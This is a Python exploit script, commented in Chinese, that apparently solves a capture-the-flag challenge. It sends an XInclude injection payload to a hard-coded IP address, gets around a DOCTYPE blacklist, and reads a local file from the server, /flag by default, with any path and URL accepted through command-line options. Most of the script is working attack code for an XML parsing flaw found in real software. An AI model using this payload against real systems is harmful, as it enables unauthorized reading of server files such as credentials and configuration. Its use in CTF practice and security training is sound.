#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import atexit
atexit.register(lambda: print("作者 ZluxYao"))
"""
29-xxe-xinclude  自动化解题脚本
================================
目标: http://47.120.76.57:34937/
姿势: 利用 XInclude 绕过 DOCTYPE 黑名单, 通过 <xi:include> 直接读取本地文件
Flag: TOGOGO-flag{...}
"""

import sys
import re
import argparse
import requests

# ---------------------------------------------------------------------------
# 默认目标 (可用 --url 覆盖)
# ---------------------------------------------------------------------------
DEFAULT_URL = "http://47.120.76.57:34937/"

# XInclude payload 模板
# - 不使用 <!DOCTYPE> -> 绕过服务端 "DOCTYPE is not allowed." 黑名单
# - xmlns:xi 引入 XInclude 命名空间
# - parse="text" 让 libxml 把目标文件作为纯文本嵌入回显
PAYLOAD_TEMPLATE = """<?xml version="1.0"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file://{path}"/>
</root>"""


def exploit(url: str, file_path: str = "/flag", timeout: int = 10) -> str:
    """对目标发起 XInclude 注入, 返回服务端回显的完整响应文本."""
    payload = PAYLOAD_TEMPLATE.format(path=file_path)
    print(f"[*] Target  : {url}")
    print(f"[*] Reading : {file_path}")
    print("[*] Payload :")
    print(payload)
    print("-" * 60)

    resp = requests.post(
        url,
        data=payload.encode("utf-8"),
        headers={"Content-Type": "application/xml"},
        timeout=timeout,
    )
    print(f"[*] HTTP {resp.status_code}")
    print(resp.text)
    print("-" * 60)
    return resp.text


def extract_flag(text: str) -> str | None:
    """从响应里抽取 TOGOGO-flag{...}."""
    m = re.search(r"TOGOGO-flag\{[^}]+\}", text)
    return m.group(0) if m else None


def main() -> int:
    ap = argparse.ArgumentParser(description="29-xxe-xinclude 自动 EXP")
    ap.add_argument("--url", default=DEFAULT_URL, help="目标 URL (默认: %(default)s)")
    ap.add_argument("--file", default="/flag", help="要读取的文件 (默认: /flag)")
    args = ap.parse_args()

    body = exploit(args.url, args.file)
    flag = extract_flag(body)
    if flag:
        print(f"[+] FLAG => {flag}")
        return 0
    print("[-] 未能从响应中提取到 flag, 请检查 payload 或目标状态")
    return 1


if __name__ == "__main__":
    sys.exit(main())
